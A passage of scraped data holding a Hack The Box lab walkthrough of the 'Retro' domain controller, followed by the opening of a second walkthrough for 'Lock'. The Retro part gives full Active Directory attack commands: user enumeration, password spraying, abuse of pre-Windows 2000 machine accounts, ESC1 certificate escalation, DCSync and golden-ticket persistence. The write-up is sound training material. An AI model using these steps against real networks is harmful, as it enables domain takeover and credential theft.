| Not valid before: 2025-09-13T06:50:25 |_Not valid after: 2026-03-15T06:50:25 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 54585/tcp open msrpc Microsoft Windows RPC 54598/tcp open msrpc Microsoft Windows RPC 57425/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 57433/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%) OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-09-14T06:55:43 |_ start_date: N/A Findings: As we can see it is a DC and it is called DC.retro.vl we can also see the local reported kerberos time which is useful as we can sync our clock to it (which is integral for kerberos attacks). Updating /etc/hosts \u0026amp; Variables: I have a script I use to update variables in my .zshrc and as we now know the domain and machine values lets store them.\nupdate_var domain \u0026#34;retro.vl\u0026#34; update_var machine \u0026#34;DC\u0026#34; Now, I will update /etc/hosts for DNS and \u0026amp; further LDAP Queries.\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: sudo echo \u0026#34;$box $domain $machine.$domain $machine\u0026#34; | sudo tee -a /etc/hosts LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.\nI actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb It will dump general information \u0026amp; also detailed \u0026amp; simple information including:\nGroups Computers Users All domain objects A file containing all description fields It will also search the domain for any service/svc accounts and place them in a folder too. Let\u0026rsquo;s run it and see what we get back.\npython3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass It turns out the anonymous bind is (+NOT+) enabled and we get the below information.\n------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.234.44 • Domain Name : retro.vl • Server Name : DC • Forest Level: 7 • Domain Level: 7 ------------------------------------------------------------ Connection Attempts ------------------------------------------------------------ • Attempting SSL connection... ⚠️ Connection established but no read access • Attempting non-SSL connection... ⚠️ Connection established but no read access ------------------------------------------------------------ Connection Failed ------------------------------------------------------------ ⚠️ Could not establish LDAP connection • Anonymous bind may be disabled (good security practice) • Credentials may be incorrect • Server may be unreachable • LDAP/LDAPS ports may be filtered The functionality level determines the minimum version of Windows server that can be used for a DC.\nKnowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. Any, host OS can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest. https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.\nsudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc.\nDNS 53: Let\u0026rsquo;s use dnsenum to find if there are any interesting DNS records being served.\ndnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt $domain The entries found are just standard entries on all DC\u0026rsquo;s. Kerberos 88: Using Kerbrute to bruteforce Usernames: Kerbrute is great for bruteforcing usernames/emails when kerberos is running.\nkerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt As we can see we have managed to extract two valid emails \u0026amp; usernames. tblack \u0026amp; jburley. Lets extract the emails for ease:\nawk -F: \u0026#39;{ gsub(/^[ \\t]+|[ \\t]+$/, \u0026#34;\u0026#34;, $4); print $4 }\u0026#39; kerbruteUsers.txt \u0026gt;\u0026gt; KEmails.txt This may look complex but all it does is extract the Emails using awk and any leading/trailing whitespace.\nNow we need to extract just the usernames:\nawk -F@ \u0026#39;{ print $1 }\u0026#39; KEmails.txt \u0026gt; KUsernames.txt Now we have two files ready for use when credential stuffing or bruteforcing.\nUsing impacket-GetNPUsers for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win.\nimpacket-GetNPUsers $domain/ -request No dice this time as we could not make a successful bind. Lets try with our extracted kerbrute usernames #+begin*src shell impacket-GetNPUsers $domain/ -dc-ip $box -usersfile KUsernames.txt -format hashcat -outputfile asRepHashes.txt -no-pass #+end_srmc Neither of these users have the PREAUTH flag set. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:\nnetexec smb $box -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares As we can see guest sessions are enabled and we can access the Trainees share as a guest. Trying Usernames as Passwords: I always try usernames as passwords as well.\nnetexec smb $box -u KUsernames.txt -p KUsernames.txt --shares --continue-on-success | grep [+] We do not get any hits.\nEnumerating Users with Impacket-lookupsid: We can use impacket-lookupsid to enumerate users \u0026amp; groups on the domain, well anything that has a SID.\nimpacket-lookupsid $domain/guest@$machine.$domain -domain-sids +Note+: As we are using the \u0026ldquo;Guest\u0026rdquo; account we can just hit enter for a blank password As we can see we have even more usernames now we can add to our usernames list. We can also see there is a computer account BANKING$. Computer accounts are followed by the $ dollar sign. I rerun asreproasting and shares checks with the new users but no hits. Enumerating SMB shares using netexec: As we have access to a share via the \u0026ldquo;Guest\u0026rdquo; account we can spider them to check for interesting files\nnetexec smb $box -u \u0026#34;Guest\u0026#34; -p \u0026#34;\u0026#34; -M spider_plus As we can see 1 file was found in the share. Lets see if there is anything of note:\ncat /home/kali/.nxc/modules/nxc_spider_plus/$box.json We can see it contains a file called important.txt. #+end_src\nUsing smbclient To Connect To The Trainees Share: smbclient -U \u0026#39;guest\u0026#39; \u0026#34;\\\\\\\\$box\\\\trainees\u0026#34; Downloading The Contents of the Trainees share with smbclient: Let\u0026rsquo;s download the contents of the share, we can do this from within smbclient.\nmget * +Note+: This prompt is used to get EVERYTHING in a share.\nDiscovering All Trainee User Passwords Are The Same Reading important.txt reveals the Admin team has all trainee users sharing one set of credentials. That’s poor security hygiene: accounts should be individual so actions are attributable, access is least-privileged, and incidents are containable, this is a big no no.\nWhy This Is Risky (And Sloppy): No accountability / audit trail: Logs show the same principal, making it hard (or impossible) to trace misuse, prove innocence, or meet evidentiary standards. Blast radius on compromise: One phish/brute-force/shoulder-surf unlocks every trainee account. Lockout chain reaction: Password expiry or account lock hits all trainees at once; support load spikes. Weakens MFA \u0026amp; SSPR flows: Per-user MFA enrollment, risk-based prompts, or self-service password reset don’t map to a shared identity. Breaks device \u0026amp; conditional access baselines: You can’t enforce per-user posture (managed device, geo risk, sign-in risk). Impedes incident response: You can’t selectively disable a single user without impacting everyone; containment is “all or nothing.” Access reviews become meaningless: You can’t certify “who needs what” if many people are one account. Compliance exposure: Fails common controls in ISO 27001, SOC 2, CIS, and typical corporate policies requiring unique IDs. Training / HR tracking gaps: Attendance, performance, or misuse can’t be tied to a person; disciplinary processes get shaky. Secrets \u0026amp; API keys misuse: Shared mailbox/API tokens tied to that identity become unrotatable without freezing the cohort. 2. Foothold Re-running Usernames as Passwords \u0026amp; Discovering Trainees Password: Even though I re-ran my tests earlier with the new updated usernames list I did forget to re-test usernames as passwords. Let\u0026rsquo;s retest.\nnetexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] As we can see the Trainee user has the password set to trainee too. +Note+: This is why it\u0026rsquo;s so important to re-check and re-run tests once you have updated information.\nEnumerating As Trainee: Let\u0026rsquo;s check if the Trainee user has access to different shares.\nnetexec smb $box -u trainee -p trainee --shares As we can see they have access to the Notes share.\nAccessing the Notes Share: We can access the notes share using smbclient again.\nsmbclient -U \u0026#39;trainee\u0026#39; \u0026#34;\\\\\\\\$box\\\\Notes\u0026#34; We can see there are two files let\u0026rsquo;s grab them.\nmget * Well it turns out the user.txt is actually the flag, that was easy.\nReading ToDo.txt. Reading the note we can see there is an old machine account (which we saw earlier) BANKING$ let\u0026rsquo;s perform a bloodhound collection to get some more information.\nWe can also see they say the account was \u0026ldquo;pre-made\u0026rdquo; which means there could be setup data for it in the SYSVOL share. +Note+: Future bloodstiller here, none in the SYSVOL :(\nPerforming a Bloodhound Collection: We can use bloodhound-python to perform a collection to get a better lay of the land.\nbloodhound-python -d $domain -ns $box -c All -u $user -p $pass We then import these into bloodhound for investigation.\nBloodhound Findings: How many domain admins: 2 What users have DC Sync Privileges: Our users rights: Not a lot, no outbound object control.\nHow many users in the domain: 5 actual users Interesting user: Jburley is a member of the administration group.\nComputer Account: The machine account BANKING$ is listed but does not seem to have any outbound control \u0026amp; it\u0026rsquo;s not trusted for delegation. Enumerating The CA Using Certipy-ad: As we have creds now we can also query the CA.\ncertipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box As we can see there are alot of templates.\nDiscovering a Vulnerable Template: We can see the certificate template RetroClients is available. Looking further down we can see it\u0026rsquo;s vulnerable to the ESC1 attack. This may give us a clear route forward as if we can take over the machine account BANKING$ we can then use the ESC1 certificate attack to escalate our privileges.\n3. Privilege Escalation: Finding A Valid Privilege Escalation Path: This machine had me stumped for a while as I was not sure where to go next. We had a low level trainee account, but no shell, RDP or write access to any shares. The host also did not appear to be vulnerable to any remote privilege escalation vectors so how were we going to get control of the computer account BANKING$.\nWhen I get stuck like this I re-read all my notes and findings as well as any files I have found on the host as it\u0026rsquo;s very easy to get locked into a route we think we should take and end up overlooking clues that are left.\nI re-read the note ToDo.txt and the lines that stuck out to me were.\nWe should start with the pre created computer account. That one is older than me.\nA quick search later and we get the below result from TrustedSec. Discovering Pre Windows 2000 Machine Accounts Have Weak Default Passwords: Reading the article we find out that if a pre-created computer account has the box that says \u0026ldquo;Assign this computer account as a pre-Windows 2000 computer\u0026rdquo; ticked it will by default have it\u0026rsquo;s name set as the password in lowercase. So if a computer is called BANKING$ by default it\u0026rsquo;s password will be banking Image Source: Trusted-Sec diving-into-pre-created-computer-accounts The article also provides a valuable microsoft link from the internet archive where we can see this explained. +Caveat+: There is one caveat to this though, if someone has onboarded the computer to the domain (had it join the domain) they will be prompted to change the password.\nDetermining UserAccountControl Flags For Pre Windows 2000 Machine Accounts: Reading the article further we find out that when a computer account is created the following UserAccountControl property flags are set for the object.\n4096 = WORKSTATION_TRUST_ACCOUNT (computer account running Microsoft Windows NT 4.0 or Windows 2000) 32 = PASSWD_NOTREQD (often set on pre-created/prestaged computer accounts) Once a computer joins the domain the 32 = PASSWD_NOTREQD property is dropped, this means we can search for the combined UserAccountControl value of 4128 or the seperate values and we should only get pre-created computer accounts that have not been onboarded.\n+Important Note+: It is worth noting though adding the numbers (4096 + 32 = 4128) and filtering for this exact value can miss accounts that carry extra flags (e.g., disabled, delegation settings). Instead, it\u0026rsquo;s better to test that both bits are present, regardless of any others.\n+Important Caveat+: Searching for the Bitwise values of 4096, 32 or the combined value of 4128 does not mean that only pre-Windows 2000 computer accounts are being returned. As according to the article there is currently no way to filter just the computers that have had the Assign this computer account as a pre-Windows 2000 computer checkmark set. Instead this search will return all computers which are running legacy versions of microsoft that also do not require the PASSWD.\nSearching For Pre Windows 2000 Machine Accounts Using UserAccountControl Flags: Searching online we can find this entry on The Hacker Recipes - pre-windows-2000-computers which details how we can search for computers that match our criteria we should be able to use the below query using ldapsearch-ad.py\n+Note+: You can install ldapsearch-ad.py with the below command.\npipx install git+https://github.com/yaap7/ldapsearch-ad Trying ldapsearch-ad.py Recommended Search Terms: Trying the recommended search term as per the article yields no results for me.\nldapsearch-ad.py -l ldap://$box:389 -d \u0026#34;$domain\u0026#34; -u \u0026#34;$user\u0026#34; -p \u0026#34;$pass\u0026#34; -t search -s \u0026#39;(\u0026amp;(userAccountControl=4128)(logonCount=0))\u0026#39; However this is a very simple LDAP search so we should be able to customize the query below and use any tools that accept LDAP queries.\n\u0026#39;(\u0026amp;(userAccountControl=4128)(logonCount=0))\u0026#39; LDAP Queries To Search For Pre Windows 2000 Machine Accounts: Instead of using the recommended ldap query we can use the below ldap queries using a bitwise matching rule\u0026rsquo;s to match the values we are looking for.\nLDAP Query # Searching For Each Bitwise Value Recommended (\u0026amp;(objectClass=computer) (userAccountControl:1.2.840.113556.1.4.803:=4096) (userAccountControl:1.2.840.113556.1.4.803:=32)) # Searching For Combined Bitwise Value (\u0026amp;(objectCategory=computer) (userAccountControl:1.2.840.113556.1.4.803:=4128)) Using ldapsearch-ad.py To Search For Pre Windows 2000 Machine Accounts: We now take the above ldap query and use ldapsearch-ad.py again.\n# Specific Match ldapsearch-ad.py -l ldap://$box:389 -d \u0026#34;$domain\u0026#34; -u \u0026#34;$user\u0026#34; -p \u0026#34;$pass\u0026#34; -t search -s \u0026#39;(\u0026amp;(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))\u0026#39; As we can see the banking computer is listed as expected. Using ldapsearch To Search For Pre Windows 2000 Machine Accounts: As I said above, we are just sending an ldap query so we can also just use good ol\u0026rsquo; reliable ldapsearch.\nExport the base DN: For this to work we need to export the DN so we can pass it to ldapsearch.\n#First we need to extract the base DN from our domain variable base_dn=\u0026#34;$(awk -F. \u0026#39;{for(i=1;i\u0026lt;=NF;i++) printf \u0026#34;DC=%s,\u0026#34;, $i; print \u0026#34;\u0026#34;}\u0026#39; \u0026lt;\u0026lt;\u0026lt;\u0026#34;$domain\u0026#34; | sed \u0026#39;s/,$//\u0026#39;)\u0026#34; # You can also just manually export the values to a var like below base_dn=\u0026#34;DC=[base],DC=[dn]\u0026#34; # Example base_dn=\u0026#34;DC=retro,DC=vl\u0026#34; Run ldap query using ldapsearch: Next we run our query\nldapsearch -x -H ldap://$box:389 \\ -D \u0026#34;$user@$domain\u0026#34; -w \u0026#34;$pass\u0026#34; \\ -b \u0026#34;$base_dn\u0026#34; -s sub \\ \u0026#39;(\u0026amp;(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))\u0026#39; #Using SSL ldapsearch -x -H ldaps://$box:636 \\ -D \u0026#34;$user@$domain\u0026#34; -w \u0026#34;$pass\u0026#34; \\ -b \u0026#34;$base_dn\u0026#34; -s sub \\ \u0026#39;(\u0026amp;(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))\u0026#39; -o tls_reqcert=never +Note On SSL/TLS+: I have included the -o tls_reqcert=never argument here as this DC is using a self-signed cert so won\u0026rsquo;t work without it as there is no actual trusted CA. This flag essentially says \u0026ldquo;Don\u0026rsquo;t check if the expiry or hostnames match just encrypt the traffic and go\u0026rdquo;.\nUsing pre2k To Search For Pre Windows 2000 Machine Accounts: I also found the tool pre2k when researching tools for this issue so I will cover it here also as it\u0026rsquo;s well made.\nInstall pre2k and dependencies: git clone https://github.com/garrettfoster13/pre2k.git cd pre2k/ python3 -m venv 2k source 2k/bin/activate pip3 install . Running pre2k to look for windows machines: pre2k auth -u $user -p $pass -d $domain -dc-ip $box As we can see we get a hit as expected. Validating BANKING$ password With netexec: Now we know that that the BANKING$ host has the name set as the password let\u0026rsquo;s validate it with netexec.\nnetexec smb $box -u \u0026#39;BANKING$\u0026#39; -p \u0026#39;banking\u0026#39; --shares As we can see we get the error STATUS_NOLOGON_WORKSTATION_TRUST\nReferring back to the TrustedSec article, we’re told the below.\nYou will see the error message STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT when you have guessed the correct password for a computer account that has not been used yet.\nSide Quest: What Is A STATUS_NOLOGON_WORKSTATION_TRUST Error? If we check Microsoft’s protocol docs , we see the domain controller (DC) returns this status when an NTLM network logon is attempted using a computer account without the expected “workstation trust” context (the Netlogon secure channel / proper flags). In that case, AD won’t validate the sub-authentication package and responds with STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT.\nSpecifically it says:\nIf the account is a computer account, the subauthentication package is not verified, and the K bit of LogonInformation.LogonNetwork.Identity.ParameterControl is not set, then return STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT\nBut what does this mean? If we check the linked note reference beside it we can see it says.\nIn Windows NT, the DC cannot authenticate computer accounts.\nThat line can be misleading if read literally. It’s not simply about “NT-only” behavior; it’s about whether the workstation trust (secure channel) exists for that computer account during a network logon.\nMicrosoft\u0026rsquo;s [[ NTSTATUS table also spells out the code and message: 0xC0000199 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT -\u0026gt; \u0026ldquo;The account used is a computer account. Use your global user account or local user account to access this server.\u0026rdquo;\n+In Simple Terms+: We found the right machine password, but because the computer hasn’t established its domain trust (no Netlogon secure channel / wrong logon path), AD refuses a normal NTLM network logon and returns STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT.\nWhy The Machine Account Is Blocked: When we try and connect a pre-created, not-yet-joined computer account using its password (the lowercase sAMAccountName), the DC recognizes the account type and the password as valid, but blocks a plain NTLM network logon because there’s no workstation trust (no secure channel / right flags).\n+In Simple Terms+: Password is correct but the logon path is wrong. We’ll see STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT instead of STATUS_LOGON_FAILURE (which indicates a wrong password).\nWhy Pre-created Accounts Trigger The Error: A pre-staged computer object exists in AD, but the machine hasn’t actually joined yet, so there’s no Netlogon secure-channel secret. If we try to authenticate directly with that computer account over NTLM, AD refuses and returns STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT even when the password is correct.\nA Note About Windows NT: That “Windows NT” note is (for) historical context, not a strict version gate. The operative concept is workstation trust. You can still hit this today on modern domains (for example the domain TrustedSec was testing) when services (NAS/CIFS/SMB endpoints, etc.) reject raw computer-account network logons unless the machine has an established trust channel (or the service explicitly allows the scenario). The same status appears because the login is missing an established machine trust.\nQuick Reference Error-Code Compass (when poking at machine creds): Correct machine password, wrong logon path:\nSTATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT (0xC0000199) Wrong password:\nSTATUS_LOGON_FAILURE (0xC000006D) Account disabled / expired / other:\nSTATUS_ACCOUNT_DISABLED, STATUS_ACCOUNT_EXPIRED, etc. DC (server) trust variant for DC accounts:\nSTATUS_NOLOGON_SERVER_TRUST_ACCOUNT (0xC000019A) Changing The Password Of BANKING$ A Pre-Windows 2000 Machine: So reading the article further it says we can change the password using a number of methods. However this article is quite outdated so checking The Hacker Recipes we can see it references a pull request for impackets rpcchangepwd.py which if we check was merged into impacket-changepasswd. so we can use impacket-changepasswd\n+Note+: I am not going to be using the change password method, I am only putting this here for completeness. If you just want to get to root skip to the next section.\nChecking impacket-changepasswd help documents we can see the protocols available to us, let\u0026rsquo;s go with rpc-samr.\nimpacket-changepasswd $domain/BANKING\\$:banking@$box -newpass StR0ngP@sSw0rd! -p rpc-samr # Without vars so you can see what is being passed impacket-changepasswd retro.vl/BANKING$:banking@10.129.234.44 -newpass StR0ngP@sSw0rd! -p rpc-samr It worked! Let\u0026rsquo;s verify this via netexec. Exporting A Valid Kerberos Ticket Without Changing The Password For Pre-Windows Computer Accounts: Reading the article further there is a link at the bottom to this post on twitter which shows that we can actually request a kerberos ticket without having to reset the password.\n+Note+: In a real engagement this would be the preferred approach to take ownership of this account as we should avoid changing passwords without explicit permission.\n+Box Note+: If you are going to do this yourself you will need to reset the host as the password was just changed and it will not work otherwise.\nFirst We grab the ticket using impacket-getTGT:\nimpacket-getTGT $domain/BANKING\\$:banking Then we set the ENV KRB5CCNAME to point to the kerberos ticket:\nexport KRB5CCNAME=./BANKING\\$.ccache Let\u0026rsquo;s validate the ticket works using impacket-smbclient:\nimpacket-smbclient -k -no-pass $domain/BANKING\\$@DC We can also use netexec too or any other tool that allows kerberos authentication.\nnetexec smb $domain --use-kcache --shares +Note+: I am going to to continue this box using the kerberos method without changing the password, so if you want to follow along I would advise resetting the box if you have changed the password.\nExploiting ESC1 For Privilege Escalation: Now we have control of the account we should be able to exploit the vulnerable certificate \u0026ldquo;RetroClients\u0026rdquo; and escalate our privileges.\nHigh Level Overview of the ESC1 Attack: ESC1 allows us to request a ticket on behalf of another, often higher privileged, user by supplying a UPN (User Principle Name) once we have this ticket we can then use it to authenticate by performing a pass the cert attack. Doing this allows us to execute commands in the context of the user. In simple terms we request a certificate as the administrator and use that to authenticate as them.\n+Deep Dive+: If you want a deeper dive into the ESC1 attack I have done that in this article .\nRequesting A Certificate: If we run the command below\ncertipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca \u0026#39;retro-DC-CA\u0026#39; -template \u0026#39;RetroClients\u0026#39; -upn administrator@$domain -dc-host dc.$domain We get can see we get an error telling us the The public key does not meet the minimum size required by the specified certificate template. Modifying ESC1 Key Length Request To Get A Certificate: If we check the certipy-ad req --help we can see it\u0026rsquo;s possible to modify the key size. We need to pass the argument -key-size [length], we can also see the default length is 2048 so let\u0026rsquo;s double the length and see if that resolves this.\nWhy we might “double” the key length: Some AD CS templates enforce a minimum key length (msPKI-Minimal-Key-Size). If 2048 fails or you want stronger keys, bump to 4096. More information here certipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca \u0026#39;retro-DC-CA\u0026#39; -template \u0026#39;RetroClients\u0026#39; -upn administrator@$domain -dc-host dc.$domain -key-size 4098 As we can see we are granted a ticket administrator.pfx Attempting To Authenticate With The Ticket: Now can authenticate with the ticket and get a TGT as the administrator.\ncertipy-ad auth -username \u0026#34;administrator\u0026#34; -pfx administrator.pfx -domain $domain -dc-ip $box Looks like we have another issue, we have a SID mismatch between the certificate and the administrator user. It says to check the wiki so lets do that……well that did not shed any further light however we can supply the SID of the user we are trying to impersonate with the -sid flag, which should hopefully resolve this issue as we will be injecting it straight into the certificate.\nSupplying The SID To Get A Valid Certificate: We can get the SID from bloodhound or from output of the SID busting we did in our initial enumeration phase. Let\u0026rsquo;s request another certificate this time with the supplied SID and the modified key length.\ncertipy-ad req -k -no-pass -dc-ip $box -target DC.$domain -ca \u0026#39;retro-DC-CA\u0026#39; -template \u0026#39;RetroClients\u0026#39; -upn administrator@$domain -dc-host dc.$domain -key-size 4098 -sid \u0026#34;S-1-5-21-2983547755-698260136-4283918172-500\u0026#34; We have now have the cert with the administrator SID specified. Requesting A TGT With Our Certificate \u0026amp; Getting The Administrator Hash: Now we can use this certificate to request a ticket granting ticket on behalf of the administrator, this will also reveal the administrator\u0026rsquo;s hash.\ncertipy-ad auth -username \u0026#34;administrator\u0026#34; -pfx administrator.pfx -domain $domain -dc-ip $box It works! This means we can either authenticate with the hash or the ticket.\nLet\u0026rsquo;s get our root flag using evil-winrm and the hash.\nevil-winrm -i $box -u administrator -H $hash If we want to use the provided ticket to authenticate with evil-winrm we have to use the below syntax.\nKRB5CCNAME=\u0026#39;./administrator.ccache\u0026#39; evil-winrm -i dc.$domain -r $domain +Important Note+: If you get the error below, I have found you just need to reload the BANKING$.ccache into the ENV KRB5CCNAME again….I\u0026rsquo;m not sure why but it seems to work. 4. Persistence: Perform DCSync Attack Using netexec: Now we have the administrator hash lets perform a dcsync attack to dump all other hashes remotely.\nnetexec smb $box -u $user -H $hash -M ntdsutil Creating a Kerberos Golden Ticket: Let\u0026rsquo;s create a golden ticket so we can always get back in, granted we have administrator ticket.\nNow we will use impacket-secretsdump to retrieve the aeskey of the krbtgt account:\nimpacket-secretsdump $domain/$user@$box -hashes :$hash +Note+: I store krbtgt:aes256 value in the variable $krbtgt and have also stored the domain sid in $sid Now we use impacket-ticketer to create the Golden Ticket:\n#Using -aeskey impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator Export the ticket to the* KRB5CCNAME Variable: export KRB5CCNAME=./Administrator.ccache Let\u0026rsquo;s validate the ticket works by using the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Why create a golden ticket? \u0026ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?\u0026rdquo; Glad you asked:\nCreating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why:\nKRBTGT Hash Dependence:\nGolden Tickets are generated using the KRBTGT account hash from the target’s domain controller.\nUnlike user account passwords, KRBTGT hashes are rarely rotated (and in many organizations, +they are never changed+), so in most cases the Golden Ticket remains valid indefinitely.\nKRBTGT The Key to It All (for upto 10 years):\nA Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.\nThis makes it a reliable backdoor, especially if re-access is needed long after initial entry.\nFor instance here is the standard Administrator ticket exported from the ESC1 attack: As you can see it\u0026rsquo;s valid for 24 hours.\nAnd here is the Golden ticket made with the KRBTGT account, it\u0026rsquo;s valid for just shy of 10 years. Think about it: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the KRBTGT account, not individual users.\nLessons Learned: What did I learn? I actually learned alot about pre-2000 windows computer accounts. This was new to me so was fun to look into. I hadn\u0026rsquo;t done an ESC1 attack where I had to modify the key size or provide a specific sid so that was interesting too to learn about. What silly mistakes did I make? I spent a long time trying lots of different things when I was give the key length error instead of reverting back to the docs as I should have. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

        "content": "Lock Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Lock How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: TCP:\n#Command nmap $box -Pn -oA TCPbasicScan #Results ┌─(...oodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Lock/scans/nmap)───(kali@kali:pts/3)─┐ └─(18:55:50 on main)──\u0026gt; nmap $box -Pn -oA TCPbasicScan ──(Mon,Sep01)─┘ Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 18:55 BST Nmap scan report for 10.129.234.64 Host is up (0.022s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 445/tcp open microsoft-ds 3000/tcp open ppp 3389/tcp open ms-wbt-server Initial thoughts: This is pretty promising so far as it has web (80), samba (445), rdp (3389) and a mystery service ppp (3000) Comprehensive Scans: #Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results ┌─(...oodstiller/conte
